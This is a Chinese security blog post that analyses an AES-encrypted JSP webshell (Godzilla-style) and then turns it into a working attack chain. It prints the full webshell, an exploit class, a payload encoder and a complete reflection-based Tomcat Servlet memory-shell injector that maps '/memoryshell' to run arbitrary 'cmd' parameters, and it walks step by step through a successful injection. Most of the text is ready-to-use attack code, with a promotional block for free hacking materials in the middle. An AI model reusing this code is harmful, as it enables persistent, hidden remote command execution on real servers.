# 前言

本次分析使用了ChatGPT进行辅助分析，大大提升了工作效率，很快就分析出木马的工作流程和构造出利用方式。

![image-20230607134057823](https://image.3001.net/images/20230904/1693817240_64f59998d84ca0ab16cd3.png!small)

## 分析

  * 首先对该木马进行格式化,以增强代码的可读性。得到如下代码

    
    
    <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">  
    <jsp:declaration>  
    String xc = "3c6e0b8a9c15224a";  
    String pass = "pass";  
    String md5 = md5(pass + xc);  
    class X extends ClassLoader  
    {  
    public X(ClassLoader z)  
    {  
    super(z);  
    }  
    public Class Q(byte[] cb)  
    {  
    return super.defineClass(cb, 0, cb.length);  
    }  
    }  
    /*  
    * 作用:AES解密  
    * m:true加密，False解密  
    * */  
    public byte[] x(byte[] s, boolean m)  
    {  
    try  
    {  
    javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");  
    c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));  
    return c.doFinal(s);  
    }  
    catch(Exception e)  
    {  
    return null;  
    }  
    }  
    /*  
    * 作用:md5加密  
    * */  
    public static String md5(String s)  
    {  
    String ret = null;  
    try  
    {  
    java.security.MessageDigest m;  
    m = java.security.MessageDigest.getInstance("MD5");  
    m.update(s.getBytes(), 0, s.length());  
    ret = new  
    java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();  
    }  
    catch(Exception e)  
    {}  
    return ret;  
    }  
    /*  
    * 作用:base64加密  
    * */  
    public static String base64Encode(byte[] bs) throws Exception  
    {  
    Class base64;  
    String value = null;  
    try  
    {  
    base64 = Class.forName("java.util.Base64");  
    Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);  
    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]  
    {  
    byte[].class  
    }).invoke(Encoder, new Object[]  
    {  
    bs  
    });  
    }  
    catch(Exception e)  
    {  
    try  
    {  
    base64 = Class.forName("sun.misc.BASE64Encoder");  
    Object Encoder = base64.newInstance();  
    value = (String) Encoder.getClass().getMethod("encode", new Class[]  
    {  
    byte[].class  
    }).invoke(Encoder, new Object[]  
    {  
    bs  
    });  
    }  
    catch(Exception e2)  
    {}  
    }  
    return value;  
    }  
    /*  
    * base64解密  
    * */  
    public static byte[]base64Decode(String bs) throws Exception  
    {  
    Class base64;  
    byte[] value = null;  
    try  
    {  
    base64 = Class.forName("java.util.Base64");  
    Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);  
    value = (byte[]) decoder.getClass().getMethod("decode", new Class[]  
    {  
    String.class  
    }).invoke(decoder, new Object[]  
    {  
    bs  
    });  
    }  
    catch(Exception e)  
    {  
    try  
    {  
    base64 = Class.forName("sun.misc.BASE64Decoder");  
    Object decoder = base64.newInstance();  
    value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]  
    {  
    String.class  
    }).invoke(decoder, new Object[]  
    {  
    bs  
    });  
    }  
    catch(Exception e2)  
    {}  
    }  
    return value;  
    }  
    </jsp:declaration>  
    <jsp:scriptlet>  
    try  
    {  
    byte[] data = base64Decode(request.getParameter(pass));//对传入内容进行base64解密  
    data = x(data, false);//AES解密  
    if(session.getAttribute("payload") == null)  
    {  
    session.setAttribute("payload", new X(pageContext.getClass().getClassLoader()).Q(data));//将字节码加载  
    }  
    else  
    {  
    request.setAttribute("parameters", new String(data));  
    Object f = ((Class) session.getAttribute("payload")).newInstance();  
    f.equals(pageContext);  
    response.getWriter().write(md5.substring(0, 16));  
    response.getWriter().write(base64Encode(x(base64Decode(f.toString()), true)));  
    response.getWriter().write(md5.substring(16));  
    }  
    }  
    catch(Exception e){  
    response.getWriter().write(e.getMessage());  
    }  
    </jsp:scriptlet>  
    </jsp:root>  
    ​

  * 前期可以交付ChatGPT初步分析，理清各个函数的基本作用：

![image-20230607134909049](https://image.3001.net/images/20230904/1693817242_64f5999ac3a274ca5fc93.png!small)

  * 得知各个函数的基本功能之后我们主要看`<jsp:scriptlet>`中的内容：

    
    
    try  
    {  
    byte[] data = base64Decode(request.getParameter(pass));//对传入内容进行base64解密  
    data = x(data, false);//AES解密  
    if(session.getAttribute("payload") == null)  
    {  
    session.setAttribute("payload", new X(pageContext.getClass().getClassLoader()).Q(data));//将字节码加载  
    }  
    else  
    {  
    request.setAttribute("parameters", new String(data));  
    Object f = ((Class) session.getAttribute("payload")).newInstance();  
    f.equals(pageContext);  
    response.getWriter().write(md5.substring(0, 16));  
    response.getWriter().write(base64Encode(x(base64Decode(f.toString()), true)));  
    response.getWriter().write(md5.substring(16));  
    }  
    }  
    catch(Exception e){  
    response.getWriter().write(e.getMessage());  
    }

  * 可以看到首先会获取pass参数中的内容，进行`base64解密`获得一个字节数组，传入给`x()`,该函数第二个参数为true时候是进行加密，而第二个参数是`false`时候是解密.因此在`base64解密`后接着是`AES解密`,其中秘钥在`<jsp:declaration`>已经进行定义为`xc变量`它的值为`3c6e0b8a9c15224a`。在解密后会判断`session.getAttribute("payload")`是否为`null`，若不是`null`则将session中的payload变量设置为`X类`加载字节码后的类,在二次访问后对该类进行实例化。其基本流程如下：

![未命名文件\(89\)](https://image.3001.net/images/20230904/1693817244_64f5999c1ac6dc155ae4d.png!small)

## EXP构建

按照上述流程，我们可以编译一个class文件读取后进行AES加密->Base64加密得到EXP，恶意代码的构造，可以在静态代码段中进行编写，因为在类加载时候会自动调用静态代码段。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

> exp.java
    
    
    package exp;  
    ​  
    import java.io.IOException;  
    ​  
    public class exp {  
    static {  
    try {  
    Runtime.getRuntime().exec("touch /tmp/gg.txt");  
    } catch (IOException e) {  
    e.printStackTrace();  
    }  
    }  
    }

  * 编译为class

    
    
    javac exp.java

  * POC,我们可以利用木马中的`x()`、`base64Encode`当做EXP构成部分即可

    
    
    package Fvck;  
    ​  
    import java.io.*;  
    ​  
    class Fvck{  
    ​  
    public static byte[] readFileToByteArray(String filePath) {  
    File file = new File(filePath);  
    byte[] fileBytes = new byte[(int) file.length()];  
    ​  
    try (FileInputStream fis = new FileInputStream(file)) {  
    fis.read(fileBytes);  
    } catch (IOException e) {  
    e.printStackTrace();  
    return null;  
    }  
    ​  
    return fileBytes;  
    }  
    public static byte[] AesEncode(byte[] s, boolean m)  
    {  
    String xc = "3c6e0b8a9c15224a";  
    try  
    {  
    javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");  
    c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));  
    return c.doFinal(s);  
    }  
    catch(Exception e)  
    {  
    return null;  
    }  
    }  
    public static String base64Encode(byte[] bs) throws Exception  
    {  
    Class base64;  
    String value = null;  
    try  
    {  
    base64 = Class.forName("java.util.Base64");  
    Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);  
    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]  
    {  
    byte[].class  
    }).invoke(Encoder, new Object[]  
    {  
    bs  
    });  
    }  
    catch(Exception e)  
    {  
    try  
    {  
    base64 = Class.forName("sun.misc.BASE64Encoder");  
    Object Encoder = base64.newInstance();  
    value = (String) Encoder.getClass().getMethod("encode", new Class[]  
    {  
    byte[].class  
    }).invoke(Encoder, new Object[]  
    {  
    bs  
    });  
    }  
    catch(Exception e2)  
    {}  
    }  
    return value;  
    }  
    ​  
    public static void main(String[] args) throws Exception {  
    String result = base64Encode(AesEncode(readFileToByteArray("/Users/gqleung/Desktop/exp.class"),true));  
    System.out.println(result);  
    }  
    }  
    ​

### 内存马注入

#### 寻找Request

##### Java Object Searcher

基本使用方法

  * IDEA->File->Project Structure->SDKs->JDK home path，找到ClassPath地址

![image-20230608134745602](https://image.3001.net/images/20230904/1693817245_64f5999d24f0effc0297d.png!small)

  * 将`java-object-searcher-0.1.0-jar-with-dependencies.jar`放到该地址下的`/jre/lib/ext/`中例如:

    
    
    /Library/Java/JavaVirtualMachines/jdk1.8.0_251.jdk/Contents/Home/jre/lib/ext/java-object-searcher-0.1.0-jar-with-dependencies.jar

  * 回到`IDEA->File->Project Structure->SDKs`，将`java-object-searcher-0.1.0-jar-with-dependencies.jar`添加到依赖。

![image-20230608135436719](https://image.3001.net/images/20230904/1693817246_64f5999ee1b3a16f67bb9.png!small)

  * 在`Tomcat`上随便找个地方断点，后打开`Evaluate`

![image-20230608140900703](https://image.3001.net/images/20230904/1693817248_64f599a0cb53da4c13ffe.png!small)

  * 代码中设置日志输出文件夹,点击`Evaluate`

    
    
    //设置搜索类型包含Request关键字的对象  
    List<Keyword> keys = new ArrayList<>();  
    keys.add(new Keyword.Builder().setField_type("Request").build());  
    //定义黑名单  
    List<Blacklist> blacklists = new ArrayList<>();  
    blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());  
    //新建一个广度优先搜索Thread.currentThread()的搜索器  
    SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);  
    // 设置黑名单  
    searcher.setBlacklists(blacklists);  
    //打开调试模式,会生成log日志  
    searcher.setIs_debug(true);  
    //挖掘深度为20  
    searcher.setMax_search_depth(20);  
    //设置报告保存位置  
    searcher.setReport_save_path("/Users/gqleung/Desktop");  
    searcher.searchObject();

![image-20230608141437030](https://image.3001.net/images/20230904/1693817251_64f599a3135492b8dfe3b.png!small)

  * 在运行结束后会输出日志到保存的文件夹：

![image-20230608143438929](https://image.3001.net/images/20230904/1693817252_64f599a45cee61d533b9a.png!small)

  * 在其中找一条链子

    
    
    TargetObject = {org.apache.tomcat.util.threads.TaskThread}   
    ---> group = {java.lang.ThreadGroup}   
    ---> threads = {class [Ljava.lang.Thread;}   
    ---> [17] = {java.lang.Thread}   
    ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}   
    ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}   
    ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}   
    ---> global = {org.apache.coyote.RequestGroupInfo}

  * 创建一个线程根据上面链子寻找

![image-20230608155228194](https://image.3001.net/images/20230904/1693817253_64f599a5ce942cc8c7553.png!small)

代码编写

与上面一致,我们在`index.jsp`中随便找个地方下断点,`Evaluate`中进行查找。根据链子我们第一步是获取`group`，我们通过当前线程去获取该对象。

  * 获取group

    
    
    Thread thread = Thread.currentThread();//获取线程对象  
    Field groupField = Class.forName("java.lang.Thread").getDeclaredField("group");//获取group属性  
    groupField.setAccessible(true);  
    ThreadGroup group = (ThreadGroup)groupField.get(thread);//读取group属性的值

![image-20230609150822826](https://image.3001.net/images/20230904/1693817255_64f599a731deb96fd505a.png!small)

  * 获取threads

获取threads方法与获取group基本一致

    
    
    /*获取group*/  
    Thread thread = Thread.currentThread();  
    Field groupField = Class.forName("java.lang.Thread").getDeclaredField("group");  
    groupField.setAccessible(true);  
    ThreadGroup group = (ThreadGroup)groupField.get(thread);  
    /*获取threads*/  
    Field threadsField = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");  
    threadsField.setAccessible(true);  
    Thread[] threads = (Thread[])threadsField.get(group);

![image-20230609151523955](https://image.3001.net/images/20230904/1693817248_64f599a0cb53da4c13ffe.png!small)

我们链子下一个对象是这个数组的第`18`个元素，也就是下标为`17`的元素,直接通过下标获取即可，注意一下数据类型。

    
    
    /*获取group*/  
    Thread thread = Thread.currentThread();  
    Field groupField = Class.forName("java.lang.Thread").getDeclaredField("group");  
    groupField.setAccessible(true);  
    ThreadGroup group = (ThreadGroup)groupField.get(thread);  
    /*获取threads*/  
    Field threadsField = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");  
    threadsField.setAccessible(true);  
    Thread[] threads = (Thread[])threadsField.get(group);  
    Thread t17 = threads[17];

![image-20230609151658901](https://image.3001.net/images/20230904/1693817261_64f599ad7394517984b37.png!small)

  * 获取target

在链子中target是在`org.apache.tomcat.util.net.NioEndpoint$Poller`一个内部类中，我们直接使用这个包权限不够获取，因此可以使用上一个对象直接`getClass()`去获取,同时该`数据类型`权限也不够，因此需要用`Object`去代替.

    
    
    /*获取group*/  
    Thread thread = Thread.currentThread();  
    Field groupField = Class.forName("java.lang.Thread").getDeclaredField("group");  
    groupField.setAccessible(true);  
    ThreadGroup group = (ThreadGroup)groupField.get(thread);  
    /*获取threads*/  
    Field threadsField = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");  
    threadsField.setAccessible(true);  
    Thread[] threads = (Thread[])threadsField.get(group);  
    Thread t17 = threads[17];  
    /*获取target*/  
    Field targetField = t17.getClass().getDeclaredField("target");  
    targetField.setAccessible(true);  
    Object target = targetField.get(t17);

![image-20230609152419395](https://image.3001.net/images/20230904/1693817263_64f599af047a677b34222.png!small)

  * 获取this$0

获取方法以及原因同上

    
    
    /*获取group*/  
    Thread thread = Thread.currentThread();  
    Field groupField = Class.forName("java.lang.Thread").getDeclaredField("group");  
    groupField.setAccessible(true);  
    ThreadGroup group = (ThreadGroup)groupField.get(thread);  
    /*获取threads*/  
    Field threadsField = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");  
    threadsField.setAccessible(true);  
    Thread[] threads = (Thread[])threadsField.get(group);  
    Thread t17 = threads[17];  
    /*获取target*/  
    Field targetField = t17.getClass().getDeclaredField("target");  
    targetField.setAccessible(true);  
    Object target = targetField.get(t17);  
    /*获取this$0*/  
    Field this$0Field = target.getClass().getDeclaredField("this$0");  
    this$0Field.setAccessible(true);  
    Object this$0 = this$0Field.get(target);

![image-20230609153450084](https://image.3001.net/images/20230904/1693817264_64f599b085224fe1ee41b.png!small)

  * 获取handler

这里我们直接同上方法会报错，我们用`Class.forName`去指定包来获取看看

![image-20230609154830435](https://image.3001.net/images/20230904/1693817265_64f599b1ef15d8bb57ef4.png!small)

我们却发现还是报错了,报错提示并不存在handler这个字段

![image-20230609155007367](https://image.3001.net/images/20230904/1693817267_64f599b3ad1188ba1ca20.png!small)

我们直接从依赖中看，`AbstractProtocol`确实不存在`handler`，但是存在`handler`数据类型，并且这个数据类型是来自`org.apache.tomcat.util.net.AbstractEndpoint.Handler`

![image-20230609160208708](https://image.3001.net/images/20230904/1693817269_64f599b5ccc8a5d955bdf.png!small)

我们直接尝试从这个包获取`handler`,发现获取成功

    
    
    /*获取group*/  
    Thread thread = Thread.currentThread();  
    Field groupField = Class.forName("java.lang.Thread").getDeclaredField("group");  
    groupField.setAccessible(true);  
    ThreadGroup group = (ThreadGroup)groupField.get(thread);  
    /*获取threads*/  
    Field threadsField = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");  
    threadsField.setAccessible(true);  
    Thread[] threads = (Thread[])threadsField.get(group);  
    Thread t17 = threads[17];  
    /*获取target*/  
    Field targetField = t17.getClass().getDeclaredField("target");  
    targetField.setAccessible(true);  
    Object target = targetField.get(t17);  
    /*获取this$0*/  
    Field this$0Field = target.getClass().getDeclaredField("this$0");  
    this$0Field.setAccessible(true);  
    Object this$0 = this$0Field.get(target);  
    /*获取handler*/  
    Field handlerField = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");  
    handlerField.setAccessible(true);  
    Object handler = handlerField.get(this$0);  
    ​

![image-20230609160304524](https://image.3001.net/images/20230904/1693817272_64f599b848d340d53f56a.png!small)

  * 获取global

在获取到handler之后直接通过`getClass`获取即可

    
    
    /*获取group*/  
    Thread thread = Thread.currentThread();  
    Field groupField = Class.forName("java.lang.Thread").getDeclaredField("group");  
    groupField.setAccessible(true);  
    ThreadGroup group = (ThreadGroup)groupField.get(thread);  
    /*获取threads*/  
    Field threadsField = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");  
    threadsField.setAccessible(true);  
    Thread[] threads = (Thread[])threadsField.get(group);  
    Thread t17 = threads[17];  
    /*获取target*/  
    Field targetField = t17.getClass().getDeclaredField("target");  
    targetField.setAccessible(true);  
    Object target = targetField.get(t17);  
    /*获取this$0*/  
    Field this$0Field = target.getClass().getDeclaredField("this$0");  
    this$0Field.setAccessible(true);  
    Object this$0 = this$0Field.get(target);  
    /*获取handler*/  
    Field handlerField = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");  
    handlerField.setAccessible(true);  
    Object handler = handlerField.get(this$0);  
    /*获取global*/  
    Field globalField = handler.getClass().getDeclaredField("global");  
    globalField.setAccessible(true);  
    Object global = globalField.get(handler);

  * 回显链最终代码

    
    
    /*获取group*/  
    Thread thread = Thread.currentThread();  
    Field groupField = Class.forName("java.lang.Thread").getDeclaredField("group");  
    groupField.setAccessible(true);  
    ThreadGroup group = (ThreadGroup)groupField.get(thread);  
    /*获取threads*/  
    Field threadsField = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");  
    threadsField.setAccessible(true);  
    Thread[] threads = (Thread[])threadsField.get(group);  
    Thread t17 = threads[17];  
    /*获取target*/  
    Field targetField = t17.getClass().getDeclaredField("target");  
    targetField.setAccessible(true);  
    Object target = targetField.get(t17);  
    /*获取this$0*/  
    Field this$0Field = target.getClass().getDeclaredField("this$0");  
    this$0Field.setAccessible(true);  
    Object this$0 = this$0Field.get(target);  
    /*获取handler*/  
    Field handlerField = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");  
    handlerField.setAccessible(true);  
    Object handler = handlerField.get(this$0);  
    /*获取global*/  
    Field globalField = handler.getClass().getDeclaredField("global");  
    globalField.setAccessible(true);  
    RequestGroupInfo global = (RequestGroupInfo)globalField.get(handler);  
    /*获取processors*/  
    Field processorsField = global.getClass().getDeclaredField("processors");  
    processorsField.setAccessible(true);  
    ArrayList processors = (ArrayList)processorsField.get(global);  
    Object p0 = processors.get(0);  
    /*获取request*/  
    Field reqField = p0.getClass().getDeclaredField("req");  
    reqField.setAccessible(true);  
    org.apache.coyote.Request req = (org.apache.coyote.Request)reqField.get(p0);  
    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);

  * 结合内存马

    
    
    import org.apache.catalina.Wrapper;  
    import org.apache.catalina.core.ApplicationContext;  
    import org.apache.catalina.core.StandardContext;  
    import org.apache.coyote.RequestGroupInfo;  
    ​  
    import javax.servlet.ServletContext;  
    import javax.servlet.http.HttpServlet;  
    import javax.servlet.http.HttpServletRequest;  
    import javax.servlet.http.HttpServletResponse;  
    import java.io.*;  
    import java.lang.reflect.Field;  
    import java.util.ArrayList;  
    ​  
    ​  
    public class exp extends HttpServlet {  
    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {  
    response.setContentType("text/html");  
    String cmd = request.getParameter("cmd");  
    PrintWriter out = response.getWriter();  
    try {  
    Process ps = Runtime.getRuntime().exec(cmd);  
    BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));  
    StringBuffer sb = new StringBuffer();  
    String line;  
    while ((line = br.readLine()) != null) {  
    sb.append(line).append("\n");  
    }  
    String result = sb.toString();  
    out.print(result);  
    ​  
    } catch (Exception e) {  
    e.printStackTrace();  
    }  
    ​  
    }  
    static {  
    try {  
    Thread thread = Thread.currentThread();  
    Field group = Class.forName("java.lang.Thread").getDeclaredField("group");  
    group.setAccessible(true);  
    ThreadGroup threadGroup = (ThreadGroup) group.get(thread);  
    Field threads = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");  
    threads.setAccessible(true);  
    Thread[] thread1 = (Thread[]) threads.get(threadGroup);  
    Thread t17 = thread1[17];  
    Field targetField = Class.forName("java.lang.Thread").getDeclaredField("target");  
    targetField.setAccessible(true);  
    Object target = targetField.get(t17);  
    Field this$0Field = target.getClass().getDeclaredField("this$0");  
    this$0Field.setAccessible(true);  
    Object this$0 = this$0Field.get(target);  
    Field handlerField = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");  
    handlerField.setAccessible(true);  
    Object handler = handlerField.get(this$0);  
    Field globalField = handler.getClass().getDeclaredField("global");  
    globalField.setAccessible(true);  
    RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);  
    Field processorsField = global.getClass().getDeclaredField("processors");  
    processorsField.setAccessible(true);  
    ArrayList processors = (ArrayList) processorsField.get(global);  
    Object r0 = processors.get(0);  
    Field reqField = r0.getClass().getDeclaredField("req");  
    reqField.setAccessible(true);  
    org.apache.coyote.Request req = (org.apache.coyote.Request) reqField.get(r0);  
    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);  
    ServletContext servletContext = request.getServletContext();  
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");//获取servletContext中的context属性  
    applicationContextField.setAccessible(true);//设置该属性可访问性为True  
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);//通过反射获取applicationContextField中context的值  
    Field standarContextField = applicationContext.getClass().getDeclaredField("context");//获取context属性值  
    standarContextField.setAccessible(true);//设置该属性可访问性为True  
    StandardContext context = (StandardContext) standarContextField.get(applicationContext);//通过反射获取context的值也就是StandardContext  
    //注册Servlet  
    Wrapper wrapper  = context.createWrapper();//创建一个Wrapper  
    wrapper.setName("MemShellServlet");//设置Servlet名字  
    wrapper.setServletClass(exp.class.getName());  
    wrapper.setServlet(new exp());//实例化Servlet并设置对象为该Servlet  
    context.addChild(wrapper);//添加进Context  
    context.addServletMappingDecoded("/memoryshell","MemShellServlet");//注册Mapping  
    } catch (Exception e) {  
    }  
    }  
    }  
    ​  
    ​

#### 使用哥斯拉木马注入Tomcat Servlet内存马

  * 在tomcat中运行上述代码可以在网站`WEB-INF/classes/exp.class`生成class，我们根据前面构造的EXP生成的base64，（注意需要url编码）

![image-20230609163959732](https://image.3001.net/images/20230904/1693817273_64f599b9bf49cee6af444.png!small)

  * 需要访问两次才能触发

![image-20230609164048486](https://image.3001.net/images/20230904/1693817275_64f599bb3e4f7831a2406.png!small)

  * 成功注入内存马

![image-20230609164539751](https://image.3001.net/images/20230904/1693817277_64f599bd0c114b516f62a.png!small)

 **更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

